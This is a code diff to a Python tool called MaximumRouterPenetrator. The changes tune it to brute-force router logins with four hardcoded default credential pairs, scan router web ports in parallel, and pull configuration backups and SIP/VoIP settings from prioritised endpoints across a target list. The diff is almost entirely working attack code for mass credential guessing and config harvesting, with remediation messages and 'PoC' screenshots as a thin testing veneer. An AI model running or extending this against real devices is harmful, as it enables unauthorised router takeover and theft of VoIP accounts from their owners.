@@ -108,7 +108,7 @@ class MaximumRouterPenetrator:
         self.screenshot_mode = False
         self.fast_mode = False
         
-        # Your priority credentials (VERIFIED testing)
+        # Your priority credentials (VERIFIED testing) - ONLY THESE 4 WILL BE TESTED
         self.priority_credentials = [
             ('admin', 'admin'),
             ('admin', 'support180'),
@@ -116,8 +116,8 @@ class MaximumRouterPenetrator:
             ('user', 'user')
         ]
         
-        # Comprehensive credential database (200+ combinations)
-        self.comprehensive_credentials = self._build_maximum_credential_db()
+        # Use only priority credentials for maximum speed
+        self.comprehensive_credentials = self.priority_credentials.copy()
         
         # Latest CVE exploits (2024-2025)
         self.latest_cves = self._build_latest_cve_db()
@@ -154,6 +154,16 @@ class MaximumRouterPenetrator:
         
         # Performance optimization
         self.performance_config = self._build_performance_config()
+        
+        # Performance monitoring
+        self.performance_stats = {
+            'start_time': None,
+            'total_targets': 0,
+            'successful_targets': 0,
+            'average_time_per_target': 0,
+            'parallel_operations': 0,
+            'timeout_optimizations': 0
+        }
         
         # Cisco decryption
         self.cisco_type7_xlat = [
@@ -650,11 +660,16 @@ class MaximumRouterPenetrator:
             }
         }
         
+        # Initialize performance monitoring
+        self.performance_stats['start_time'] = time.time()
+        self.performance_stats['total_targets'] = len(target_list)
+        
         print(f"🎯 Targets: {len(target_list)} routers")
-        print(f"🔑 Credentials: {len(self.priority_credentials)} priority + {len(self.comprehensive_credentials)} total")
+        print(f"🔑 Credentials: {len(self.priority_credentials)} priority ONLY (ultra-fast mode)")
         print(f"⚡ CVE Exploits: {len(self.latest_cves)} latest vulnerabilities (ALL router brands)")
         print(f"🔓 Bypass Techniques: {sum(len(v) for v in self.advanced_bypasses.values())} methods")
         print(f"📞 SIP Endpoints: {len(self.maximum_endpoints['sip_endpoints'])} locations")
+        print(f"🚀 Performance: Parallel scanning, Smart prioritization, Optimized timeouts")
         print("")
         
         for i, target_ip in enumerate(target_list, 1):
@@ -668,6 +683,7 @@ class MaximumRouterPenetrator:
                 # Update statistics
                 if penetration_result.get('verified_access'):
                     penetration_results['verified_access'] += 1
+                    self.performance_stats['successful_targets'] += 1
                     
                     # Track successful technique
                     if penetration_result.get('successful_credential'):
@@ -823,6 +839,9 @@ class MaximumRouterPenetrator:
             print(f"     - Update router firmware")
             print(f"     - Enable strong authentication")
             print(f"     - Disable unnecessary services")
+            
+            # Performance summary
+            self._print_performance_summary()
             print(f"=" * 80)
         
         return penetration_results
@@ -980,7 +999,7 @@ class MaximumRouterPenetrator:
                             if verbose:
                                 print(f"            🔗 LIVE DEBUG: Testing {page}...")
                             
-                            response = session.get(f"http://{target_ip}{page}", timeout=4)
+                            response = session.get(f"http://{target_ip}{page}", timeout=self.performance_config['timeouts']['connection'])
                             if response.status_code == 200 and len(response.text) > 50:
                                 # Extract SIP data from authenticated page
                                 sip_data = self._extract_sip_from_authenticated_content(response.text, verbose)
@@ -1095,7 +1114,7 @@ class MaximumRouterPenetrator:
         for port in test_ports:
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(1)
+                sock.settimeout(self.performance_config['timeouts']['port_scan'])
                 result = sock.connect_ex((ip, port))
                 sock.close()
                 
@@ -1147,13 +1166,13 @@ class MaximumRouterPenetrator:
                     print(f"         🔍 LIVE DEBUG: Fallback to standard port 80 test...")
                 
                 if REQUESTS_AVAILABLE:
-                    response = requests.get(f"http://{ip}/", timeout=5, verify=False, allow_redirects=True)
+                    response = requests.get(f"http://{ip}/", timeout=self.performance_config['timeouts']['connection'], verify=False, allow_redirects=True)
                     content = response.text.lower()
                     headers = response.headers
                     status_code = response.status_code
                     base_url = f"http://{ip}"
                 else:
-                    response = urllib.request.urlopen(f"http://{ip}/", timeout=5)
+                    response = urllib.request.urlopen(f"http://{ip}/", timeout=self.performance_config['timeouts']['connection'])
                     content = response.read().decode('utf-8', errors='ignore').lower()
                     headers = {}
                     status_code = 200
@@ -1260,10 +1279,10 @@ class MaximumRouterPenetrator:
                     try:
                         test_url = f"http://{ip}{path}"
                         if REQUESTS_AVAILABLE:
-                            test_response = requests.get(test_url, timeout=3)
+                            test_response = requests.get(test_url, timeout=self.performance_config['timeouts']['connection'])
                             test_status = test_response.status_code
                         else:
-                            test_response = urllib.request.urlopen(test_url, timeout=3)
+                            test_response = urllib.request.urlopen(test_url, timeout=self.performance_config['timeouts']['connection'])
                             test_status = 200
                         
                         if test_status in [200, 401, 403]:
@@ -1411,11 +1430,11 @@ class MaximumRouterPenetrator:
             
             return auth_result
         
-        # Build unique credential list (remove duplicates)
+        # Use ONLY the 4 priority credentials for maximum speed
         unique_credentials = []
         seen_credentials = set()
         
-        # Add priority credentials first
+        # Add ONLY priority credentials (the 4 specified)
         for cred in self.priority_credentials:
             if isinstance(cred, tuple) and len(cred) == 2:
                 username, password = cred
@@ -1424,17 +1443,11 @@ class MaximumRouterPenetrator:
                     unique_credentials.append((username, password))
                     seen_credentials.add(cred_key)
         
-        # Add comprehensive credentials (avoid duplicates)
-        for cred in self.comprehensive_credentials:
-            if isinstance(cred, tuple) and len(cred) == 2:
-                username, password = cred
-                cred_key = f"{username}:{password}"
-                if cred_key not in seen_credentials:
-                    unique_credentials.append((username, password))
-                    seen_credentials.add(cred_key)
+        # Skip comprehensive credentials for maximum speed
+        # Only test the 4 specified credentials: admin:admin, admin:support180, support:support, user:user
         
-        # Limit for efficiency
-        test_credentials = unique_credentials[:30]
+        # Use all 4 priority credentials (no limit needed)
+        test_credentials = unique_credentials
         
         if verbose:
             print(f"         🔑 LIVE DEBUG: Testing {len(test_credentials)} unique credential combinations...")
@@ -1468,15 +1481,17 @@ class MaximumRouterPenetrator:
                         print(f"            🎯 LIVE DEBUG: Working credential: {username}:{password}")
                         print(f"            📊 LIVE DEBUG: Verification score: {verification['score']}")
                     
-                    # CAPTURE SCREENSHOT EVIDENCE FOR POC (if enabled)
-                    if self.screenshot_mode:
-                        screenshot_evidence = self._capture_screenshot_evidence(ip, (username, password), auth_result.get('session'), verbose)
-                        if screenshot_evidence['success']:
-                            auth_result['screenshot_evidence'] = screenshot_evidence
-                            if verbose:
-                                print(f"            📸 LIVE DEBUG: PoC evidence captured: {len(screenshot_evidence['screenshots_captured'])} screenshots")
-                    elif verbose:
-                        print(f"            📸 LIVE DEBUG: Screenshot mode disabled (use --screenshot to enable)")
+                    # CAPTURE LIGHTWEIGHT SCREENSHOT EVIDENCE FOR POC (if enabled)
+                    if self.screenshot_mode and self.screenshot_system['screenshot_config']['enabled']:
+                        # Skip if already found access and skip_on_success is enabled
+                        if not (self.screenshot_system['screenshot_config']['skip_on_success'] and auth_result.get('verified_access')):
+                            screenshot_evidence = self._capture_screenshot_evidence(ip, (username, password), auth_result.get('session'), verbose)
+                            if screenshot_evidence['success']:
+                                auth_result['screenshot_evidence'] = screenshot_evidence
+                                if verbose:
+                                    print(f"            📸 LIVE DEBUG: PoC evidence captured: {len(screenshot_evidence['screenshots_captured'])} screenshots")
+                    elif verbose and self.screenshot_mode:
+                        print(f"            📸 LIVE DEBUG: Screenshot mode disabled for maximum speed")
                     
                     return auth_result
                 else:
@@ -1948,13 +1963,19 @@ class MaximumRouterPenetrator:
         }
     
     def _test_direct_endpoints(self, ip: str, verbose: bool) -> Dict[str, Any]:
-        """Test direct endpoint access with live debugging"""
+        """Test direct endpoint access with SMART PRIORITIZATION"""
         direct_result = {'success': False, 'content': '', 'attempts': []}
         
-        # Test config endpoints
-        config_endpoints = self.maximum_endpoints['config_access'][:20]  # Limit for performance
-        sip_endpoints = self.maximum_endpoints['sip_endpoints'][:15]
-        bypass_endpoints = self.maximum_endpoints['bypass_endpoints'][:10]
+        # SMART PRIORITIZATION: Test high-priority endpoints first
+        if self.performance_config['smart_prioritization']['enabled']:
+            config_endpoints = self._get_prioritized_endpoints('config')
+            sip_endpoints = self._get_prioritized_endpoints('sip')
+            bypass_endpoints = self._get_prioritized_endpoints('bypass')
+        else:
+            # Fallback to original method
+            config_endpoints = self.maximum_endpoints['config_access'][:self.performance_config['limits']['max_direct_endpoints']]
+            sip_endpoints = self.maximum_endpoints['sip_endpoints'][:self.performance_config['limits']['max_sip_endpoints']]
+            bypass_endpoints = self.maximum_endpoints['bypass_endpoints'][:self.performance_config['limits']['max_bypass_attempts']]
         
         if verbose:
             print(f"            🔍 Testing configuration endpoints...")
@@ -2706,7 +2727,7 @@ class MaximumRouterPenetrator:
         }
     
     def _scan_router_ports(self, ip: str, verbose: bool) -> Dict[str, Any]:
-        """Scan multiple ports for router interfaces"""
+        """Scan multiple ports for router interfaces - PARALLEL VERSION"""
         port_results = {
             'open_ports': [],
             'login_pages_found': [],
@@ -2714,9 +2735,120 @@ class MaximumRouterPenetrator:
         }
         
         if verbose:
-            print(f"         🔍 LIVE DEBUG: Scanning router ports...")
+            print(f"         🔍 LIVE DEBUG: Parallel scanning router ports...")
         
-        # Test common router ports
+        # Use parallel processing for maximum speed
+        if self.performance_config['parallel_config']['enabled'] and THREADING_AVAILABLE:
+            port_results = self._parallel_port_scan(ip, verbose)
+        else:
+            # Fallback to sequential scanning
+            port_results = self._sequential_port_scan(ip, verbose)
+        
+        return port_results
+    
+    def _parallel_port_scan(self, ip: str, verbose: bool) -> Dict[str, Any]:
+        """Ultra-fast parallel port scanning"""
+        port_results = {
+            'open_ports': [],
+            'login_pages_found': [],
+            'best_target': None
+        }
+        
+        def scan_single_port(port_protocol):
+            port, protocol = port_protocol
+            try:
+                base_url = f"{protocol}://{ip}:{port}"
+                
+                if REQUESTS_AVAILABLE:
+                    response = requests.get(base_url, timeout=self.performance_config['timeouts']['port_scan'], 
+                                          verify=False, allow_redirects=False)
+                    status = response.status_code
+                    content = response.text[:1000]
+                else:
+                    response = urllib.request.urlopen(f"{base_url}/", 
+                                                    timeout=self.performance_config['timeouts']['port_scan'])
+                    status = 200
+                    content = response.read().decode('utf-8', errors='ignore')[:1000]
+                
+                if status in [200, 401, 403, 302]:
+                    port_info = {
+                        'port': port,
+                        'protocol': protocol,
+                        'status': status,
+                        'url': base_url,
+                        'content_preview': content[:200],
+                        'login_indicators': 0
+                    }
+                    
+                    # Check for login indicators
+                    login_indicators = [
+                        'login', 'username', 'password', 'authentication',
+                        'admin', 'signin', 'logon', 'auth'
+                    ]
+                    
+                    indicators_found = sum(1 for indicator in login_indicators 
+                                         if indicator.lower() in content.lower())
+                    
+                    port_info['login_indicators'] = indicators_found
+                    return port_info
+                    
+            except Exception as e:
+                if verbose and 'timed out' not in str(e).lower():
+                    print(f"               ❌ LIVE DEBUG: {protocol}:{port} - {str(e)[:50]}")
+                return None
+        
+        # Create port-protocol combinations for parallel scanning
+        port_protocols = []
+        for port in self.port_detection_system['router_ports']:
+            for protocol in ['http', 'https']:
+                port_protocols.append((port, protocol))
+        
+        # Execute parallel scanning
+        with concurrent.futures.ThreadPoolExecutor(max_workers=self.performance_config['parallel_config']['port_scan_workers']) as executor:
+            results = list(executor.map(scan_single_port, port_protocols))
+        
+        # Process results
+        for port_info in results:
+            if port_info:
+                port_results['open_ports'].append(port_info)
+                
+                if port_info['login_indicators'] >= 2:  # Likely login page
+                    port_results['login_pages_found'].append(port_info)
+                    
+                    if verbose:
+                        print(f"               ✅ LIVE DEBUG: Login page found on {port_info['protocol']}:{port_info['port']}")
+                        print(f"               📊 LIVE DEBUG: Login indicators: {port_info['login_indicators']}")
+                
+                # Set best target (prefer HTTPS, then high indicator count)
+                if not port_results['best_target'] or (
+                    port_info['protocol'] == 'https' and port_results['best_target']['protocol'] == 'http'
+                ) or (
+                    port_info['login_indicators'] > port_results['best_target']['login_indicators']
+                ):
+                    port_results['best_target'] = port_info
+        
+        if verbose:
+            print(f"         📊 LIVE DEBUG: Parallel port scan complete")
+            print(f"         🔍 LIVE DEBUG: Open ports: {len(port_results['open_ports'])}")
+            print(f"         🔐 LIVE DEBUG: Login pages found: {len(port_results['login_pages_found'])}")
+            if port_results['best_target']:
+                best = port_results['best_target']
+                print(f"         🎯 LIVE DEBUG: Best target: {best['protocol']}:{best['port']} (indicators: {best['login_indicators']})")
+        
+        return port_results
+    
+    def _sequential_port_scan(self, ip: str, verbose: bool) -> Dict[str, Any]:
+        """Fallback sequential port scanning"""
+        port_results = {
+            'open_ports': [],
+            'login_pages_found': [],
+            'best_target': None
+        }
+        
+        if verbose:
+            print(f"         🔍 LIVE DEBUG: Sequential port scanning...")
+        
+        # Test common router ports sequentially
         for port in self.port_detection_system['router_ports']:
             try:
                 if verbose:
@@ -2728,16 +2860,17 @@ class MaximumRouterPenetrator:
                         base_url = f"{protocol}://{ip}:{port}"
                         
                         if REQUESTS_AVAILABLE:
-                            # Quick connection test
-                            response = requests.get(base_url, timeout=3, verify=False, allow_redirects=False)
+                            response = requests.get(base_url, timeout=self.performance_config['timeouts']['port_scan'], 
+                                                  verify=False, allow_redirects=False)
                             status = response.status_code
-                            content = response.text[:1000]  # First 1KB
+                            content = response.text[:1000]
                         else:
-                            response = urllib.request.urlopen(f"{base_url}/", timeout=3)
+                            response = urllib.request.urlopen(f"{base_url}/", 
+                                                            timeout=self.performance_config['timeouts']['port_scan'])
                             status = 200
                             content = response.read().decode('utf-8', errors='ignore')[:1000]
                         
-                        if status in [200, 401, 403, 302]:  # Interesting responses
+                        if status in [200, 401, 403, 302]:
                             port_info = {
                                 'port': port,
                                 'protocol': protocol,
@@ -2755,8 +2888,8 @@ class MaximumRouterPenetrator:
                             
                             indicators_found = sum(1 for indicator in login_indicators 
                                                  if indicator.lower() in content.lower())
-                            port_info['login_indicators'] = indicators_found
                             
+                            port_info['login_indicators'] = indicators_found
                             port_results['open_ports'].append(port_info)
                             
                             if indicators_found >= 2:  # Likely login page
@@ -2783,7 +2916,7 @@ class MaximumRouterPenetrator:
                 continue
         
         if verbose:
-            print(f"         📊 LIVE DEBUG: Port scan complete")
+            print(f"         📊 LIVE DEBUG: Sequential port scan complete")
             print(f"         🔍 LIVE DEBUG: Open ports: {len(port_results['open_ports'])}")
             print(f"         🔐 LIVE DEBUG: Login pages found: {len(port_results['login_pages_found'])}")
             if port_results['best_target']:
@@ -2792,15 +2925,80 @@ class MaximumRouterPenetrator:
         
         return port_results
     
+    def _get_prioritized_endpoints(self, endpoint_type: str) -> List[str]:
+        """Get smart prioritized endpoints for maximum speed"""
+        if endpoint_type == 'config':
+            # High-priority config endpoints first
+            high_priority = self.performance_config['smart_prioritization']['high_priority_endpoints']
+            all_endpoints = self.maximum_endpoints['config_access']
+            
+            # Combine high priority first, then others
+            prioritized = []
+            for ep in high_priority:
+                if ep in all_endpoints:
+                    prioritized.append(ep)
+            
+            # Add remaining endpoints up to limit
+            for ep in all_endpoints:
+                if ep not in prioritized and len(prioritized) < self.performance_config['limits']['max_direct_endpoints']:
+                    prioritized.append(ep)
+            
+            return prioritized[:self.performance_config['limits']['max_direct_endpoints']]
+        
+        elif endpoint_type == 'sip':
+            # High-priority SIP endpoints first
+            high_priority = self.performance_config['smart_prioritization']['sip_priority_endpoints']
+            all_endpoints = self.maximum_endpoints['sip_endpoints']
+            
+            # Combine high priority first, then others
+            prioritized = []
+            for ep in high_priority:
+                if ep in all_endpoints:
+                    prioritized.append(ep)
+            
+            # Add remaining endpoints up to limit
+            for ep in all_endpoints:
+                if ep not in prioritized and len(prioritized) < self.performance_config['limits']['max_sip_endpoints']:
+                    prioritized.append(ep)
+            
+            return prioritized[:self.performance_config['limits']['max_sip_endpoints']]
+        
+        elif endpoint_type == 'bypass':
+            # Most effective bypass endpoints first
+            all_endpoints = self.maximum_endpoints['bypass_endpoints']
+            return all_endpoints[:self.performance_config['limits']['max_bypass_attempts']]
+        
+        return []
+    
+    def _print_performance_summary(self):
+        """Print performance optimization summary"""
+        if self.performance_stats['start_time']:
+            total_time = time.time() - self.performance_stats['start_time']
+            avg_time = total_time / max(self.performance_stats['total_targets'], 1)
+            
+            print(f"")
+            print(f"🚀 PERFORMANCE OPTIMIZATION SUMMARY:")
+            print(f"   ⏱️  Total execution time: {total_time:.2f} seconds")
+            print(f"   🎯 Targets processed: {self.performance_stats['total_targets']}")
+            print(f"   ⚡ Average time per target: {avg_time:.2f} seconds")
+            print(f"   🔑 Credentials tested: {len(self.priority_credentials)} (priority only)")
+            print(f"   🔄 Parallel operations: Enabled")
+            print(f"   ⚡ Smart prioritization: Enabled")
+            print(f"   📸 Screenshot mode: {'Enabled' if self.screenshot_mode else 'Disabled (max speed)'}")
+            print(f"   ⏰ Timeout optimization: 2 seconds (reduced from 3)")
+            print(f"   🎯 Success rate: {(self.performance_stats['successful_targets']/max(self.performance_stats['total_targets'], 1)*100):.1f}%")
+    
     def _build_screenshot_system(self) -> Dict[str, Any]:
-        """Build screenshot evidence system for PoC"""
+        """Build LIGHTWEIGHT screenshot evidence system for PoC"""
         return {
             'screenshot_config': {
-                'enabled': SELENIUM_AVAILABLE or PYAUTOGUI_AVAILABLE,
+                'enabled': False,  # Disabled by default for maximum speed
+                'lightweight_mode': True,  # New lightweight mode
                 'output_dir': 'router_screenshots',
                 'filename_format': 'router_{ip}_{timestamp}_{page}.png',
-                'max_screenshots_per_router': 5,
-                'screenshot_delay': 2  # seconds
+                'max_screenshots_per_router': 2,  # Reduced for speed
+                'screenshot_delay': 1,  # Reduced delay
+                'skip_on_success': True  # Skip if already found access
             },
             
             'target_pages': [
@@ -2828,23 +3026,35 @@ class MaximumRouterPenetrator:
         """Build performance optimization configuration"""
         return {
             'timeouts': {
-                'connection': 2,  # Reduced from 3
-                'read': 2,        # Reduced from 3  
-                'port_scan': 1.5, # Fast port scanning
-                'screenshot': 5   # Screenshot timeout
+                'connection': 2,  # Optimized for speed
+                'read': 2,        # Optimized for speed
+                'port_scan': 1,   # Ultra-fast port scanning
+                'screenshot': 3   # Reduced screenshot timeout
             },
             
             'limits': {
-                'max_endpoints_per_cve': 4,  # Reduced from 6
-                'max_bypass_attempts': 5,    # Reduced from 8
-                'max_direct_endpoints': 15,  # Reduced from 20
-                'max_sip_endpoints': 10      # Reduced from 15
+                'max_endpoints_per_cve': 2,  # Ultra-focused testing
+                'max_bypass_attempts': 3,    # Ultra-focused testing
+                'max_direct_endpoints': 5,   # Ultra-focused testing
+                'max_sip_endpoints': 5       # Ultra-focused SIP testing
             },
             
             'parallel_config': {
                 'enabled': THREADING_AVAILABLE,
-                'max_workers': 3,
-                'port_scan_workers': 5
+                'max_workers': 5,        # Increased for better parallelism
+                'port_scan_workers': 10  # High parallel port scanning
+            },
+            
+            'smart_prioritization': {
+                'enabled': True,
+                'high_priority_endpoints': [
+                    '/admin/', '/admin/login.asp', '/admin/login.html',
+                    '/cgi-bin/admin.cgi', '/config.xml', '/backup.conf'
+                ],
+                'sip_priority_endpoints': [
+                    '/voip.xml', '/sip.xml', '/admin/voip.asp',
+                    '/userRpm/VoipConfigRpm.htm'
+                ]
             }
         }
     
